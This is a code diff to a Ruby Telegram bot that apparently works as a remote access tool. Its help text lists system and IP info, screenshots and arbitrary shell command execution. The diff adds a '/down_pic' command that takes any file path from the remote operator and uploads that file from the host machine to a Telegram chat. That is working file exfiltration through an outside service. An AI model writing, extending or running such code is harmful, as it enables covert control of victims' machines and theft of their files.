@@ -18,6 +18,12 @@ Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
     begin
         bot.listen do |message|
             #bot.api.send_message(chat_id: message.chat.id, text: "Bot Has running...")
+            # Download picture
+            if m = message.text.match(/\/down_pic (.*)/)
+              puts m[1]
+              bot.api.send_message(chat_id: message.chat.id, text: "[+] Downloading and Uploading to Telegram...\nPlease waiting...")
+              bot.api.send_photo(chat_id: message.chat.id, photo: Faraday::UploadIO.new(m[1], 'image/png'))
+            end
 
             case message.text
             when '/start'
@@ -33,7 +39,7 @@ Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
                 help = """Help:
     /info => To Get ip and system info
     /screenShot => Get ScreenShot of system
-    /upload  =>  Uploading File (Demo)
+    /down_pic [image name + path]  =>  Uploading File (Demo)
 
 for run shell command just send without `/` and \nRecive result.
 
